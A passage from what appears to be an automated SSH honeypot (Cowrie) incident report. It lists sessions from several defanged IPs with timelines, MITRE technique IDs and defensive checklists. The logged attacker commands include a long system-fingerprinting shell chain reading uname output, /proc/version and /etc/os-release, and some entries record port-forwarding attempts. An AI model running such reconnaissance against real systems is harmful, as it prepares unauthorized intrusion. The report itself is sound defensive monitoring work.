| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:05:23` | `cowrie.session.connect` |
| `2026-08-02 04:05:23` | `cowrie.client.version` |
| `2026-08-02 04:05:23` | `cowrie.client.kex` |
| `2026-08-02 04:05:25` | `cowrie.login.success` |
| `2026-08-02 04:05:26` | `cowrie.session.params` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:26` | `cowrie.command.success` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:26` | `cowrie.command.input` |
| `2026-08-02 04:05:27` | `cowrie.log.closed` |
| `2026-08-02 04:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdd4a1ebb010

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 04:06 |
| **Last Seen** | 2026-08-02 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:06:26` | `cowrie.session.connect` |
| `2026-08-02 04:06:26` | `cowrie.client.version` |
| `2026-08-02 04:06:26` | `cowrie.client.kex` |
| `2026-08-02 04:06:26` | `cowrie.login.success` |
| `2026-08-02 04:06:27` | `cowrie.session.params` |
| `2026-08-02 04:06:27` | `cowrie.command.input` |
| `2026-08-02 04:06:27` | `cowrie.log.closed` |
| `2026-08-02 04:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da25af50f6ac

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:06 |
| **Last Seen** | 2026-08-02 04:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:06:29` | `cowrie.session.connect` |
| `2026-08-02 04:06:29` | `cowrie.client.version` |
| `2026-08-02 04:06:29` | `cowrie.client.kex` |
| `2026-08-02 04:06:30` | `cowrie.login.success` |
| `2026-08-02 04:06:32` | `cowrie.session.params` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.command.success` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.command.input` |
| `2026-08-02 04:06:32` | `cowrie.log.closed` |
| `2026-08-02 04:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-071ff12d08cd

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:07 |
| **Last Seen** | 2026-08-02 04:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:07:39` | `cowrie.session.connect` |
| `2026-08-02 04:07:39` | `cowrie.client.version` |
| `2026-08-02 04:07:39` | `cowrie.client.kex` |
| `2026-08-02 04:07:39` | `cowrie.login.success` |
| `2026-08-02 04:07:40` | `cowrie.session.params` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:40` | `cowrie.command.success` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:40` | `cowrie.command.input` |
| `2026-08-02 04:07:41` | `cowrie.log.closed` |
| `2026-08-02 04:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433c938fc243

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 04:07 |
| **Last Seen** | 2026-08-02 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:07:58` | `cowrie.session.connect` |
| `2026-08-02 04:07:58` | `cowrie.client.version` |
| `2026-08-02 04:07:58` | `cowrie.client.kex` |
| `2026-08-02 04:07:59` | `cowrie.login.success` |
| `2026-08-02 04:08:00` | `cowrie.session.params` |
| `2026-08-02 04:08:00` | `cowrie.command.input` |
| `2026-08-02 04:08:00` | `cowrie.log.closed` |
| `2026-08-02 04:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd59ea395378

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:09 |
| **Last Seen** | 2026-08-02 04:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:09:02` | `cowrie.session.connect` |
| `2026-08-02 04:09:02` | `cowrie.client.version` |
| `2026-08-02 04:09:02` | `cowrie.client.kex` |
| `2026-08-02 04:09:03` | `cowrie.login.success` |
| `2026-08-02 04:09:04` | `cowrie.session.params` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.command.success` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.command.input` |
| `2026-08-02 04:09:04` | `cowrie.log.closed` |
| `2026-08-02 04:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32dd7ef91373

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:10 |
| **Last Seen** | 2026-08-02 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:10:55` | `cowrie.session.connect` |
| `2026-08-02 04:10:55` | `cowrie.client.version` |
| `2026-08-02 04:10:55` | `cowrie.client.kex` |
| `2026-08-02 04:10:55` | `cowrie.login.success` |
| `2026-08-02 04:10:56` | `cowrie.session.params` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.command.success` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.command.input` |
| `2026-08-02 04:10:56` | `cowrie.log.closed` |
| `2026-08-02 04:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-add21b01fcec

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:13 |
| **Last Seen** | 2026-08-02 04:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:13:03` | `cowrie.session.connect` |
| `2026-08-02 04:13:03` | `cowrie.client.version` |
| `2026-08-02 04:13:03` | `cowrie.client.kex` |
| `2026-08-02 04:13:04` | `cowrie.login.success` |
| `2026-08-02 04:13:05` | `cowrie.session.params` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.command.success` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.command.input` |
| `2026-08-02 04:13:05` | `cowrie.log.closed` |
| `2026-08-02 04:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c87cb34200c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:14 |
| **Last Seen** | 2026-08-02 04:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:14:05` | `cowrie.session.connect` |
| `2026-08-02 04:14:05` | `cowrie.client.version` |
| `2026-08-02 04:14:05` | `cowrie.client.kex` |
| `2026-08-02 04:14:07` | `cowrie.login.success` |
| `2026-08-02 04:14:09` | `cowrie.session.params` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.command.success` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.command.input` |
| `2026-08-02 04:14:09` | `cowrie.log.closed` |
| `2026-08-02 04:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0b5eca35e8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:15 |
| **Last Seen** | 2026-08-02 04:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:15:08` | `cowrie.session.connect` |
| `2026-08-02 04:15:09` | `cowrie.client.version` |
| `2026-08-02 04:15:09` | `cowrie.client.kex` |
| `2026-08-02 04:15:10` | `cowrie.login.success` |
| `2026-08-02 04:15:11` | `cowrie.session.params` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.command.success` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.command.input` |
| `2026-08-02 04:15:11` | `cowrie.log.closed` |
| `2026-08-02 04:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f7583fc7083

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:16 |
| **Last Seen** | 2026-08-02 04:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:16:19` | `cowrie.session.connect` |
| `2026-08-02 04:16:20` | `cowrie.client.version` |
| `2026-08-02 04:16:20` | `cowrie.client.kex` |
| `2026-08-02 04:16:20` | `cowrie.login.success` |
| `2026-08-02 04:16:22` | `cowrie.session.params` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.command.success` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.command.input` |
| `2026-08-02 04:16:22` | `cowrie.log.closed` |
| `2026-08-02 04:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7af95f30f5a2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:17 |
| **Last Seen** | 2026-08-02 04:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:17:39` | `cowrie.session.connect` |
| `2026-08-02 04:17:39` | `cowrie.client.version` |
| `2026-08-02 04:17:39` | `cowrie.client.kex` |
| `2026-08-02 04:17:40` | `cowrie.login.success` |
| `2026-08-02 04:17:40` | `cowrie.session.params` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:40` | `cowrie.command.success` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:40` | `cowrie.command.input` |
| `2026-08-02 04:17:41` | `cowrie.log.closed` |
| `2026-08-02 04:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8fa095ec9ba

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-08-02 04:18 |
| **Last Seen** | 2026-08-02 04:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:18:20` | `cowrie.session.connect` |
| `2026-08-02 04:18:20` | `cowrie.client.version` |
| `2026-08-02 04:18:20` | `cowrie.client.kex` |
| `2026-08-02 04:18:22` | `cowrie.login.success` |
| `2026-08-02 04:18:23` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b53ef59051f

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
| **First Seen** | 2026-08-02 04:18 |
| **Last Seen** | 2026-08-02 04:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:18:33` | `cowrie.session.connect` |
| `2026-08-02 04:18:34` | `cowrie.client.version` |
| `2026-08-02 04:18:34` | `cowrie.client.kex` |
| `2026-08-02 04:18:35` | `cowrie.login.success` |
| `2026-08-02 04:18:36` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c901e7f4621e

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-02 04:19 |
| **Last Seen** | 2026-08-02 04:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:19:05` | `cowrie.session.connect` |
| `2026-08-02 04:19:06` | `cowrie.client.version` |
| `2026-08-02 04:19:06` | `cowrie.client.kex` |
| `2026-08-02 04:19:07` | `cowrie.login.success` |
| `2026-08-02 04:19:08` | `cowrie.direct-tcpip.request` |
